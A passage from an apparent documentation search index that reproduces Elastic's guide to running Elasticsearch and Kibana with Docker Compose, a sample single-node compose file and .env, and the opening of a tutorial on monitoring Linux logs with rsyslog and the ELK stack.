     condition: service_healthy\n      es03:\n        condition: service_healthy\n    image: docker.elastic.co/kibana/kibana:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/kibana/config/certs\n      - kibanadata:/usr/share/kibana/data\n    ports:\n      - ${KIBANA_PORT}:5601\n    environment:\n      - SERVERNAME=kibana\n      - ELASTICSEARCH_HOSTS=https://es01:9200\n      - ELASTICSEARCH_USERNAME=kibana_system\n      - ELASTICSEARCH_PASSWORD=${KIBANA_PASSWORD}\n      - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt\n    mem_limit: ${MEM_LIMIT}\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s -I http://localhost:5601 | grep -q 'HTTP/1.1 302 Found'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\nvolumes:\n  certs:\n    driver: local\n  esdata01:\n    driver: local\n  esdata02:\n    driver: local\n  esdata03:\n    driver: local\n  kibanadata:\n    driver: local\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#start-your-cluster-with-security-enabled-and-configurededit","title":"Start your cluster with security enabled and configurededit","text":"<ol> <li>Modify the <code>.env</code> file and enter strong password values for both the <code>ELASTIC_PASSWORD</code> and <code>KIBANA_PASSWORD</code> variables.</li> </ol> <p>You must use the <code>ELASTIC_PASSWORD</code> value for further interactions with the cluster. The <code>KIBANA_PASSWORD</code> value is only used internally when configuring Kibana.</p> <ol> <li>Create and start the three-node Elasticsearch cluster and Kibana instance:</li> </ol> <p><code>sh    docker-compose up -d</code></p> <ol> <li>When the deployment has started, open a browser and navigate to http://localhost:5601 to access Kibana, where you can load sample data and interact with your cluster.</li> </ol>"},{"location":"Elastic/ElasticKibanaCompose/#stop-and-remove-the-deploymentedit","title":"Stop and remove the deploymentedit","text":"<p>To stop the cluster, run <code>docker-compose down</code>. The data in the Docker volumes is preserved and loaded when you restart the cluster with <code>docker-compose up</code>.</p> <pre><code>docker-compose down\n</code></pre> <p>To delete the network, containers, and volumes when you stop the cluster, specify the <code>-v</code> option:</p> <pre><code>docker-compose down -v\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#next-stepsedit_1","title":"Next stepsedit","text":"<p>You now have a test Elasticsearch environment set up. Before you start serious development or go into production with Elasticsearch, review the requirements and recommendations to apply when running Elasticsearch in Docker in production.</p>"},{"location":"Elastic/ElasticKibanaCompose/#using-the-docker-images-in-productionedit","title":"Using the Docker images in productionedit","text":"<p>The following requirements and recommendations apply when running Elasticsearch in Docker in production.</p>"},{"location":"Elastic/ElasticKibanaCompose/#set-vmmax_map_count-to-at-least-262144edit","title":"Set <code>vm.max_map_count</code> to at least <code>262144</code>edit","text":"<p>The <code>vm.max_map_count</code> kernel setting must be set to at least <code>262144</code> for production use.</p> <p>How you set <code>vm.max_map_count</code> depends on your platform.</p>"},{"location":"Elastic/ElasticKibanaCompose/#linuxedit","title":"Linuxedit","text":"<p>To view the current value for the <code>vm.max_map_count</code> setting, run:</p> <pre><code>grep vm.max_map_count /etc/sysctl.conf\nvm.max_map_count=262144\n</code></pre> <p>To apply the setting on a live system, run:</p> <pre><code>sysctl -w vm.max_map_count=262144\n</code></pre> <p>To permanently change the value for the <code>vm.max_map_count</code> setting, update the value in <code>/etc/sysctl.conf</code>.</p>"},{"location":"Elastic/ElasticKibanaCompose/#macos-with-docker-for-macedit","title":"macOS with Docker for Macedit","text":"<p>The <code>vm.max_map_count</code> setting must be set within the xhyve virtual machine:</p> <ol> <li>From the command line, run:</li> </ol> <p><code>sh    screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code></p> <ol> <li>Press enter and use <code>sysctl</code> to configure <code>vm.max_map_count</code>:</li> </ol> <p><code>sh    sysctl -w vm.max_map_count=262144</code></p> <ol> <li>To exit the <code>screen</code> session, type <code>Ctrl a d</code>.</li> </ol>"},{"location":"Elastic/ElasticKibanaCompose/#windows-and-macos-with-docker-desktopedit","title":"Windows and macOS with Docker Desktopedit","text":"<p>The <code>vm.max_map_count</code> setting must be set via docker-machine:</p> <pre><code>docker-machine ssh\nsudo sysctl -w vm.max_map_count=262144\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#windows-with-docker-desktop-wsl-2-backendedit","title":"Windows with Docker Desktop WSL 2 backendedit","text":"<p>The <code>vm.max_map_count</code> setting must be set in the docker-desktop container:</p> <pre><code>wsl -d docker-desktop\nsysctl -w vm.max_map_count=262144\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#configuration-files-must-be-readable-by-the-elasticsearch-useredit","title":"Configuration files must be readable by the <code>elasticsearch</code> useredit","text":"<p>By default, Elasticsearch runs inside the container as user <code>elasticsearch</code> using uid:gid <code>1000:0</code>.</p> <p>One exception is Openshift, which runs containers using an arbitrarily assigned user ID. Openshift presents persistent volumes with the gid set to <code>0</code>, which works without any adjustments.</p> <p>If you are bind-mounting a local directory or file, it must be readable by the <code>elasticsearch</code> user. In addition, this user must have write access to the config, data and log dirs (Elasticsearch needs write access to the <code>config</code> directory so that it can generate a keystore). A good strategy is to grant group access to gid <code>0</code> for the local directory.</p> <p>For example, to prepare a local directory for storing data through a bind-mount:</p> <pre><code>mkdir esdatadir\nchmod g+rwx esdatadir\nchgrp 0 esdatadir\n</code></pre> <p>You can also run an Elasticsearch container using both a custom UID and GID. You must ensure that file permissions will not prevent Elasticsearch from executing. You can use one of two options:</p> <ul> <li>Bind-mount the <code>config</code>, <code>data</code> and <code>logs</code> directories. If you intend to install plugins and prefer not to create a custom Docker image, you must also bind-mount the <code>plugins</code> directory.</li> <li>Pass the <code>--group-add 0</code> command line option to <code>docker run</code>. This ensures that the user under which Elasticsearch is running is also a member of the <code>root</code> (GID 0) group inside the container.</li> </ul>"},{"location":"Elastic/ElasticKibanaCompose/#increase-ulimits-for-nofile-and-nprocedit","title":"Increase ulimits for nofile and nprocedit","text":"<p>Increased ulimits for nofile and nproc must be available for the Elasticsearch containers. Verify the init system for the Docker daemon sets them to acceptable values.</p> <p>To check the Docker daemon defaults for ulimits, run:</p> <pre><code>docker run --rm docker.elastic.co/elasticsearch/elasticsearch:{version} /bin/bash -c 'ulimit -Hn &amp;&amp; ulimit -Sn &amp;&amp; ulimit -Hu &amp;&amp; ulimit -Su'\n</code></pre> <p>If needed, adjust them in the Daemon or override them per container. For example, when using <code>docker run</code>, set:</p> <pre><code>--ulimit nofile=65535:65535\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#disable-swappingedit","title":"Disable swappingedit","text":"<p>Swapping needs to be disabled for performance and node stability. For information about ways to do this, see Disable swapping.</p> <p>If you opt for the <code>bootstrap.memory_lock: true</code> approach, you also need to define the <code>memlock: true</code> ulimit in the Docker Daemon, or explicitly set for the container as shown in the sample compose file. When using <code>docker run</code>, you can specify:</p> <pre><code>-e \"bootstrap.memory_lock=true\" --ulimit memlock=-1:-1\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#randomize-published-portsedit","title":"Randomize published portsedit","text":"<p>The image exposes TCP ports 9200 and 9300. For production clusters, randomizing the published ports with <code>--publish-all</code> is recommended, unless you are pinning one container per host.</p>"},{"location":"Elastic/ElasticKibanaCompose/#manually-set-the-heap-sizeedit","title":"Manually set the heap sizeedit","text":"<p>By default, Elasticsearch automatically sizes JVM heap based on a nodes\u2019s roles and the total memory available to the node\u2019s container. We recommend this default sizing for most production environments. If needed, you can override default sizing by manually setting JVM heap size.</p> <p>To manually set the heap size in production, bind mount a JVM options file under <code>/usr/share/elasticsearch/config/jvm.options.d</code> that includes your desired heap size settings.</p> <p>For testing, you can also manually set the heap size using the <code>ES_JAVA_OPTS</code> environment variable. For example, to use 16GB, specify <code>-e ES_JAVA_OPTS=\"-Xms16g -Xmx16g\"</code> with <code>docker run</code>. The <code>ES_JAVA_OPTS</code> variable overrides all other JVM options. We do not recommend using <code>ES_JAVA_OPTS</code> in production. The <code>docker-compose.yml</code> file above sets the heap size to 512MB.</p>"},{"location":"Elastic/ElasticKibanaCompose/#pin-deployments-to-a-specific-image-versionedit","title":"Pin deployments to a specific image versionedit","text":"<p>Pin your deployments to a specific version of the Elasticsearch Docker image. For example <code>docker.elastic.co/elasticsearch/elasticsearch:8.6.1</code>.</p>"},{"location":"Elastic/ElasticKibanaCompose/#always-bind-data-volumesedit","title":"Always bind data volumesedit","text":"<p>You should use a volume bound on <code>/usr/share/elasticsearch/data</code> for the following reasons:</p> <ol> <li>The data of your Elasticsearch node won\u2019t be lost if the container is killed</li> <li>Elasticsearch is I/O sensitive and the Docker storage driver is not ideal for fast I/O</li> <li>It allows the use of advanced Docker volume plugins</li> </ol>"},{"location":"Elastic/ElasticKibanaCompose/#avoid-using-loop-lvm-modeedit","title":"Avoid using <code>loop-lvm</code> modeedit","text":"<p>If you are using the devicemapper storage driver, do not use the default <code>loop-lvm</code> mode. Configure docker-engine to use direct-lvm.</p>"},{"location":"Elastic/ElasticKibanaCompose/#centralize-your-logsedit","title":"Centralize your logsedit","text":"<p>Consider centralizing your logs by using a different logging driver. Also note that the default json-file logging driver is not ideally suited for production use.</p>"},{"location":"Elastic/ElasticKibanaCompose/#configuring-elasticsearch-with-dockeredit","title":"Configuring Elasticsearch with Dockeredit","text":"<p>When you run in Docker, the Elasticsearch configuration files are loaded from <code>/usr/share/elasticsearch/config/</code>.</p> <p>To use custom configuration files, you bind-mount the files over the configuration files in the image.</p> <p>You can set individual Elasticsearch configuration parameters using Docker environment variables. The sample compose file and the single-node example use this method. You can use the setting name directly as the environment variable name. If you cannot do this, for example because your orchestration platform forbids periods in environment variable names, then you can use an alternative style by converting the setting name as follows.</p> <ol> <li>Change the setting name to uppercase</li> <li>Prefix it with <code>ES_SETTING_</code></li> <li>Escape any underscores (<code>_</code>) by duplicating them</li> <li>Convert all periods (<code>.</code>) to underscores (<code>_</code>)</li> </ol> <p>For example, <code>-e bootstrap.memory_lock=true</code> becomes <code>-e ES_SETTING_BOOTSTRAP_MEMORY__LOCK=true</code>.</p> <p>You can use the contents of a file to set the value of the <code>ELASTIC_PASSWORD</code> or <code>KEYSTORE_PASSWORD</code> environment variables, by suffixing the environment variable name with <code>_FILE</code>. This is useful for passing secrets such as passwords to Elasticsearch without specifying them directly.</p> <p>For example, to set the Elasticsearch bootstrap password from a file, you can bind mount the file and set the <code>ELASTIC_PASSWORD_FILE</code> environment variable to the mount location. If you mount the password file to <code>/run/secrets/bootstrapPassword.txt</code>, specify:</p> <pre><code>-e ELASTIC_PASSWORD_FILE=/run/secrets/bootstrapPassword.txt\n</code></pre> <p>You can override the default command for the image to pass Elasticsearch configuration parameters as command line options. For example:</p> <pre><code>docker run &lt;various parameters&gt; bin/elasticsearch -Ecluster.name=mynewclustername\n</code></pre> <p>While bind-mounting your configuration files is usually the preferred method in production, you can also create a custom Docker image that contains your configuration.</p>"},{"location":"Elastic/ElasticKibanaCompose/#mounting-elasticsearch-configuration-filesedit","title":"Mounting Elasticsearch configuration filesedit","text":"<p>Create custom config files and bind-mount them over the corresponding files in the Docker image. For example, to bind-mount <code>custom_elasticsearch.yml</code> with <code>docker run</code>, specify:</p> <pre><code>-v full_path_to/custom_elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml\n</code></pre> <p>If you bind-mount a custom <code>elasticsearch.yml</code> file, ensure it includes the <code>network.host: 0.0.0.0</code> setting. This setting ensures the node is reachable for HTTP and transport traffic, provided its ports are exposed. The Docker image\u2019s built-in <code>elasticsearch.yml</code> file includes this setting by default.</p> <p>The container runs Elasticsearch as user <code>elasticsearch</code> using uid:gid <code>1000:0</code>. Bind mounted host directories and files must be accessible by this user, and the data and log directories must be writable by this user.</p>"},{"location":"Elastic/ElasticKibanaCompose/#create-an-encrypted-elasticsearch-keystoreedit","title":"Create an encrypted Elasticsearch keystoreedit","text":"<p>By default, Elasticsearch will auto-generate a keystore file for secure settings. This file is obfuscated but not encrypted.</p> <p>To encrypt your secure settings with a password and have them persist outside the container, use a <code>docker run</code> command to manually create the keystore instead. The command must:</p> <ul> <li>Bind-mount the <code>config</code> directory. The command will create an <code>elasticsearch.keystore</code> file in this directory. To avoid errors, do not directly bind-mount the <code>elasticsearch.keystore</code> file.</li> <li>Use the <code>elasticsearch-keystore</code> tool with the <code>create -p</code> option. You\u2019ll be prompted to enter a password for the keystore.</li> </ul> <p>For example:</p> <pre><code>docker run -it --rm \\\n-v full_path_to/config:/usr/share/elasticsearch/config \\\ndocker.elastic.co/elasticsearch/elasticsearch:8.6.1 \\\nbin/elasticsearch-keystore create -p\n</code></pre> <p>You can also use a <code>docker run</code> command to add or update secure settings in the keystore. You\u2019ll be prompted to enter the setting values. If the keystore is encrypted, you\u2019ll also be prompted to enter the keystore password.</p> <pre><code>docker run -it --rm \\\n-v full_path_to/config:/usr/share/elasticsearch/config \\\ndocker.elastic.co/elasticsearch/elasticsearch:8.6.1 \\\nbin/elasticsearch-keystore \\\nadd my.secure.setting \\\nmy.other.secure.setting\n</code></pre> <p>If you\u2019ve already created the keystore and don\u2019t need to update it, you can bind-mount the <code>elasticsearch.keystore</code> file directly. You can use the <code>KEYSTORE_PASSWORD</code> environment variable to provide the keystore password to the container at startup. For example, a <code>docker run</code> command might have the following options:</p> <pre><code>-v full_path_to/config/elasticsearch.keystore:/usr/share/elasticsearch/config/elasticsearch.keystore\n-e KEYSTORE_PASSWORD=mypassword\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#using-custom-docker-imagesedit","title":"Using custom Docker imagesedit","text":"<p>In some environments, it might make more sense to prepare a custom image that contains your configuration. A <code>Dockerfile</code> to achieve this might be as simple as:</p> <pre><code>FROM docker.elastic.co/elasticsearch/elasticsearch:8.6.1\nCOPY --chown=elasticsearch:elasticsearch elasticsearch.yml /usr/share/elasticsearch/config/\n</code></pre> <p>You could then build and run the image with:</p> <pre><code>docker build --tag=elasticsearch-custom .\ndocker run -ti -v /usr/share/elasticsearch/data elasticsearch-custom\n</code></pre> <p>Some plugins require additional security permissions. You must explicitly accept them either by:</p> <ul> <li>Attaching a <code>tty</code> when you run the Docker image and allowing the permissions when prompted.</li> <li>Inspecting the security permissions and accepting them (if appropriate) by adding the <code>--batch</code> flag to the plugin install command.</li> </ul> <p>See Plugin management for more information.</p>"},{"location":"Elastic/ElasticKibanaCompose/#troubleshoot-docker-errors-for-elasticsearchedit","title":"Troubleshoot Docker errors for Elasticsearchedit","text":"<p>Here\u2019s how to resolve common errors when running Elasticsearch with Docker.</p>"},{"location":"Elastic/ElasticKibanaCompose/#elasticsearchkeystore-is-a-directoryedit","title":"elasticsearch.keystore is a directoryedit","text":"<pre><code>Exception in thread \"main\" org.elasticsearch.bootstrap.BootstrapException: java.io.IOException: Is a directory: SimpleFSIndexInput(path=\"/usr/share/elasticsearch/config/elasticsearch.keystore\") Likely root cause: java.io.IOException: Is a directory\n</code></pre> <p>A keystore-related <code>docker run</code> command attempted to directly bind-mount an <code>elasticsearch.keystore</code> file that doesn\u2019t exist. If you use the <code>-v</code> or <code>--volume</code> flag to mount a file that doesn\u2019t exist, Docker instead creates a directory with the same name.</p> <p>To resolve this error:</p> <ol> <li>Delete the <code>elasticsearch.keystore</code> directory in the <code>config</code> directory.</li> <li>Update the <code>-v</code> or <code>--volume</code> flag to point to the <code>config</code> directory path rather than the keystore file\u2019s path. For an example, see Create an encrypted Elasticsearch keystore.</li> <li>Retry the command.</li> </ol>"},{"location":"Elastic/ElasticKibanaCompose/#elasticsearchkeystore-device-or-resource-busyedit","title":"elasticsearch.keystore: Device or resource busyedit","text":"<pre><code>Exception in thread \"main\" java.nio.file.FileSystemException: /usr/share/elasticsearch/config/elasticsearch.keystore.tmp -&gt; /usr/share/elasticsearch/config/elasticsearch.keystore: Device or resource busy\n</code></pre> <p>A <code>docker run</code> command attempted to update the keystore while directly bind-mounting the <code>elasticsearch.keystore</code> file. To update the keystore, the container requires access to other files in the <code>config</code> directory, such as <code>keystore.tmp</code>.</p> <p>To resolve this error:</p> <ol> <li>Update the <code>-v</code> or <code>--volume</code> flag to point to the <code>config</code> directory path rather than the keystore file\u2019s path. For an example, see Create an encrypted Elasticsearch keystore.</li> <li>Retry the command.</li> </ol>"},{"location":"Elastic/ElasticKibanaComposeCustom/","title":"ElasticKibanaComposeCustom","text":"<pre><code>sudo sysctl -w vm.max_map_count=262144\n</code></pre> <pre><code>version: \"2.2\"\n\nservices:\n  setup:\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n    user: \"0\"\n    command: &gt;\n      bash -c '\n        if [ x${ELASTIC_PASSWORD} == x ]; then\n          echo \"Set the ELASTIC_PASSWORD environment variable in the .env file\";\n          exit 1;\n        elif [ x${KIBANA_PASSWORD} == x ]; then\n          echo \"Set the KIBANA_PASSWORD environment variable in the .env file\";\n          exit 1;\n        fi;\n        if [ ! -f config/certs/ca.zip ]; then\n          echo \"Creating CA\";\n          bin/elasticsearch-certutil ca --silent --pem -out config/certs/ca.zip;\n          unzip config/certs/ca.zip -d config/certs;\n        fi;\n        if [ ! -f config/certs/certs.zip ]; then\n          echo \"Creating certs\";\n          echo -ne \\\n          \"instances:\\n\"\\\n          \"  - name: es01\\n\"\\\n          \"    dns:\\n\"\\\n          \"      - es01\\n\"\\\n          \"      - localhost\\n\"\\\n          \"    ip:\\n\"\\\n          \"      - 127.0.0.1\\n\"\\\n          &gt; config/certs/instances.yml;\n          bin/elasticsearch-certutil cert --silent --pem -out config/certs/certs.zip --in config/certs/instances.yml --ca-cert config/certs/ca/ca.crt --ca-key config/certs/ca/ca.key;\n          unzip config/certs/certs.zip -d config/certs;\n        fi;\n        echo \"Setting file permissions\"\n        chown -R root:root config/certs;\n        find . -type d -exec chmod 750 \\{\\} \\;;\n        find . -type f -exec chmod 640 \\{\\} \\;;\n        echo \"Waiting for Elasticsearch availability\";\n        until curl -s --cacert config/certs/ca/ca.crt https://es01:9200 | grep -q \"missing authentication credentials\"; do sleep 30; done;\n        echo \"Setting kibana_system password\";\n        until curl -s -X POST --cacert config/certs/ca/ca.crt -u \"elastic:${ELASTIC_PASSWORD}\" -H \"Content-Type: application/json\" https://es01:9200/_security/user/kibana_system/_password -d \"{\\\"password\\\":\\\"${KIBANA_PASSWORD}\\\"}\" | grep -q \"^{}\"; do sleep 10; done;\n        echo \"All done!\";\n      '\n    healthcheck:\n      test: [\"CMD-SHELL\", \"[ -f config/certs/es01/es01.crt ]\"]\n      interval: 1s\n      timeout: 5s\n      retries: 120\n\n  es01:\n    depends_on:\n      setup:\n        condition: service_healthy\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n      - esdata01:/usr/share/elasticsearch/data\n    ports:\n      - ${ES_PORT}:9200\n    environment:\n      - node.name=es01\n      - cluster.name=${CLUSTER_NAME}\n      - cluster.initial_master_nodes=es01\n      - ELASTIC_PASSWORD=${ELASTIC_PASSWORD}\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=true\n      - xpack.security.http.ssl.enabled=true\n      - xpack.security.http.ssl.key=certs/es01/es01.key\n      - xpack.security.http.ssl.certificate=certs/es01/es01.crt\n      - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.enabled=true\n      - xpack.security.transport.ssl.key=certs/es01/es01.key\n      - xpack.security.transport.ssl.certificate=certs/es01/es01.crt\n      - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.verification_mode=certificate\n      - xpack.license.self_generated.type=${LICENSE}\n    mem_limit: ${MEM_LIMIT}\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q 'missing authentication credentials'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\n  kibana:\n    depends_on:\n      es01:\n        condition: service_healthy\n    image: docker.elastic.co/kibana/kibana:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/kibana/config/certs\n      - kibanadata:/usr/share/kibana/data\n    ports:\n      - ${KIBANA_PORT}:5601\n    environment:\n      - SERVERNAME=kibana\n      - ELASTICSEARCH_HOSTS=https://es01:9200\n      - ELASTICSEARCH_USERNAME=kibana_system\n      - ELASTICSEARCH_PASSWORD=${KIBANA_PASSWORD}\n      - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt\n    mem_limit: ${MEM_LIMIT}\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s -I http://localhost:5601 | grep -q 'HTTP/1.1 302 Found'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\nvolumes:\n  certs:\n    driver: local\n  esdata01:\n    driver: local\n  kibanadata:\n    driver: local\n</code></pre> <pre><code>#.env\n# Password for the 'elastic' user (at least 6 characters)\nELASTIC_PASSWORD=testing123\n\n# Password for the 'kibana_system' user (at least 6 characters)\nKIBANA_PASSWORD=testing123\n\n# Version of Elastic products\nSTACK_VERSION=8.6.1\n\n# Set the cluster name\nCLUSTER_NAME=docker-cluster\n\n# Set to 'basic' or 'trial' to automatically start the 30-day trial\nLICENSE=basic\n#LICENSE=trial\n\n# Port to expose Elasticsearch HTTP API to the host\nES_PORT=9200\n#ES_PORT=127.0.0.1:9200\n\n# Port to expose Kibana to the host\nKIBANA_PORT=5601\n#KIBANA_PORT=80\n\n# Increase or decrease based on the available host memory (in bytes)\nMEM_LIMIT=1073741824\n\n# Project namespace (defaults to the current folder name if not set)\n#COMPOSE_PROJECT_NAME=myproject\n</code></pre>"},{"location":"Elastic/RsyslogKibana/","title":"Monitoring Linux Logs with Kibana and Rsyslog","text":"<p>written by Schkn</p> <p></p> <p>This tutorial details how to build a monitoring pipeline to analyze Linux logs with ELK 7.2 and Rsyslog.</p> <p>If you are a system administrator, or even a curious application developer, there is a high chance that you are regularly digging into your logs to find precious information in them.</p> <p>Sometimes you may want to monitor SSH intrusions on your VMs.</p> <p>Sometimes, you might want to see what errors were raised by your application server on a certain day, on a very specific hour. Or you may want to have some insights about who stopped your systemd service on one of your VMs.</p> <p>If you pictured yourself in one of those points, you are probably on the right tutorial.</p> <p>In this tutorial, we are to build a complete log monitoring pipeline using the ELK stack (ElasticSearch, Logstash and Kibana) and Rsyslog as a powerful syslog server.</p> <p>Before going any further, and jumping into technical considerations right away, let\u2019s have a talk about why do we want to monitor Linux logs with Kibana.</p>"},{"location":"Elastic/RsyslogKibana/#i-why-should-you-monitor-linux-logs","title":"I \u2013 Why should you monitor Linux logs?","text":"<p>Monitoring Linux logs is crucial and every DevOps engineer should know how to do it. Here\u2019s why :</p> <ul> <li>You have real-time visual feedback about your logs : probably one of the key aspects of log monitoring, you can build meaningful visualizations (such as datatables, pies, graphs or aggregated bar charts) to give some meaning to your logs.</li> <li>You are able to aggregate information to build advanced and more complex dashboards : sometimes raw information is not enough, you may want to join it with other logs or to compare it with other logs to identify a trend. A visualization platform with expression handling lets you perform that.</li> <li>You can quickly filter for a certain term, or given a certain time period : if you are only interested in SSH logs, you can build a targeted dashboard for it.</li> <li>Logs are navigable in a quick and elegant way : I know the pain of tailing and greping your logs files endlessly. I\u2019d rather have a platform for it.</li> </ul> <p></p>"},{"location":"Elastic/RsyslogKibana/#ii-what-you-will-learn","title":"II \u2013 What You Will Learn","text":"<p>There are many things that you are going to learn if you follow this tutorial:</p> <ul> <li>How logs are handled on a Linux system (Ubuntu or Debian) and what rsyslog is.</li> <li>How to install the ELK stack (ElasticSearch 7.2, Logstash and Kibana) and what those tools will be used for.</li> <li>How to configure rsyslog to forward logs to Logstash</li> <li>How to configure Logstash for log ingestion and ElasticSearch storage.</li> <li>How to play with Kibana to build our final visualization dashboard.</li> </ul> <p></p> <p>The prerequisites for this tutorial are as follows :</p> <ul> <li>You have a Linux system with rsyslog installed. You either have a standalone machine with rsyslog, or a centralized logging system.</li> <li>You have administrator rights or you have enough rights to install new packages on your Linux system.</li> </ul> <p>Without further due, let\u2019s jump into it!</p>"},{"location":"Elastic/RsyslogKibana/#iii-what-does-a-log-monitoring-architecture-looks-like","title":"III \u2013 What does a log monitoring architecture looks like?","text":""},{"location":"Elastic/RsyslogKibana/#a-key-concepts-of-linux-logging","title":"a \u2013 Key concepts of Linux logging","text":"<p>Before detailing how our log monitoring architecture looks like, let\u2019s go back in time for a second.</p> <p>Historically, Linux logging starts with syslog.</p> <p>Syslog is a protocol developed in 1980 which aims at standardizing the way logs are formatted, not only for Linux, but for any system exchanging logs.</p> <p>From there, syslog servers were developed and were embedded with the capability of handling syslog messages.</p> <p>They rapidly evolved to functionalities such as filtering, having content routing abilities, or probably one of the key features of such servers : storing logs and rotating them.</p> <p>Rsyslog was developed keeping this key functionality in mind : having a modular and customizable way to handle logs.</p> <p>The modularity would be handled with modules and the customization with log templates.</p> <p>In a way, rsyslog can ingest logs from many different sources and it can forward them to an even wider set of destinations. This is what we are going to use in our tutorial.</p>"},{"location":"Elastic/RsyslogKibana/#b-building-a-log-monitoring-architecture","title":"b \u2013 Building a log monitoring architecture","text":"<p>Here\u2019s the final architecture that we are going to use for this tutorial.</p> <ul> <li>rsyslog : used as an advancement syslog server, rsyslog will forward logs to Logstash in the RFC 5424 format we described before.</li> <li>Logstash : part of the ELK stack, Logstash will transform logs from the syslog format to JSON. As a reminder, ElasticSearch takes JSON as an input.</li> <li>ElasticSearch : the famous search engine will store logs in a dedicated log index (logstash-*). ElasticSearch will naturally index the logs and make them available for analyzing.</li> <li>Kibana : used as an exploration and visualization platform, Kibana will host our final dashboard.</li> </ul> <p></p> <p>Now that we know in which direction we are heading, let\u2019s install the different tools needed.</p>"},{"location":"Elastic/RsyslogKibana/#iv-installing-the-different-tools","title":"IV \u2013 Installing The Different Tools","text":""},{"location":"Elastic/RsyslogKibana/#a-installing-java-on-ubuntu","title":"a \u2013 Installing Java on Ubuntu","text":"<p>Before installing the ELK stack, you need to install Java on your computer.</p> <p>To do so, run the following command:</p> <pre><code>$ sudo apt-get install default-jre\n</code></pre> <p>At the time of this tutorial, this instance runs the OpenJDK version 11.</p> <pre><code>ubuntu:~$ java -version\nopenjdk version \"11.0.3\" 2019-04-16\nOpenJDK Runtime Environment (build 11.0.3+7-Ubuntu-1ubuntu218.04.1)\nOpenJDK 64-Bit Server VM (build 11.0.3+7-Ubuntu-1ubuntu218.04.1, mixed mode, sharing)\n</code></pre>"},{"location":"Elastic/RsyslogKibana/#b-adding-elastic-packages-to-your-instance","title":"b \u2013 Adding Elastic packages to your instance","text":"<p>For this tutorial, I am going to use a Ubuntu machine but details will be given for Debian ones.</p> <p>First, add the GPG key to your APT repository.</p> <pre><code>$ wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -\n</code></pre> <p>Then, you can add Elastic source to your APT source list file.</p> <pre><code>$ echo \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list\n\n$ cat /etc/apt/sources.list.d/elastic-7.x.list\ndeb https://artifacts.elastic.co/packages/7.x/apt stable main\n\n$ sudo apt-get update\n</code></pre> <p>From there, you should be ready to install every tool in the ELK stack.</p> <p>Let\u2019s start with ElasticSearch.</p>"},{"location":"Elastic/RsyslogKibana/#c-installing-elasticsearch","title":"c \u2013 Installing ElasticSearch","text":"<p>ElasticSearch is a search engine built by Elastic that stores data in indexes for very fast retrieval.</p> <p>To install it, run the following command:</p> <pre><code>$ sudo apt-get install elasticsearch\n</code></pre> <p>The following command will automatically :</p> <ul> <li>Download the deb package for ElasticSearch;</li> <li>Create an elasticsearch user;</li> <li>Create an elasticsearch group;</li> <li>Automatically create a systemd service fully configured (inactive by default)</li> </ul> <p></p> <p>On first start, the service is inactive, start it and make sure that everything is running smoothly.</p> <pre><code>$ sudo systemctl start elasticsearch\n\u25cf elasticsearch.service - Elasticsearch\n   Loaded: loaded (/usr/lib/systemd/system/elasticsearch.service; disabled; vendor preset: enabled)\n   Active: active (running) since Mon 2019-07-08 18:19:45 UTC; 2 days ago\n     Docs: http://www.elastic.co\n</code></pre> <p>In order to make sure that ElasticSearch is actually running, you can execute one of those two commands:</p> <ul> <li>Watching which applications listen on a targeted port</li> </ul> <pre><code>$ sudo lsof -i -P -n | grep LISTEN | grep 9200\njava      10667   elasticsearch  212u  IPv6 1159208890      0t0  TCP [::1]:9200 (LISTEN)\njava      10667   elasticsearch  213u  IPv6 1159208891      0t0  TCP 127.0.0.1:9200 (LISTEN)\n</code></pre> <ul> <li>Executing a simple ElasticSearch query</li> </ul> <pre><code>$ curl -XGET 'http://localhost:9200/_all/_search?q=*&amp;pretty'\n</code></pre> <p>Your ElasticSearch instance is all set!</p> <p>Now, let\u2019s install Logstash as our log collection and filtering tool.</p>"},{"location":"Elastic/RsyslogKibana/#d-installing-logstash","title":"d \u2013 Installing Logstash","text":"<p>If you added Elastic packages previously, installing Logstash is as simple as executing:</p> <pre><code>$ sudo apt-get install logstash\n</code></pre> <p>Again, a Logstash service will be created, and you need to activate it.</p> <pre><code>$ sudo systemctl status logstash\n$ sudo systemctl start logstash\n</code></pre> <p>By default, Logstash listens for metrics on port 9600. As we did before, list the open ports on your computer looking for that specific port.</p> <pre><code>$ sudo lsof -i -P -n | grep LISTEN | grep 9600\njava      28872        logstash   79u  IPv6 1160098941      0t0  TCP 127.0.0.1:9600 (LISTEN)\n</code></pre> <p>Great!</p> <p>We only need to install Kibana for our entire setup to be complete.</p>"},{"location":"Elastic/RsyslogKibana/#e-installing-kibana","title":"e \u2013 Installing Kibana","text":"<p>As a reminder, 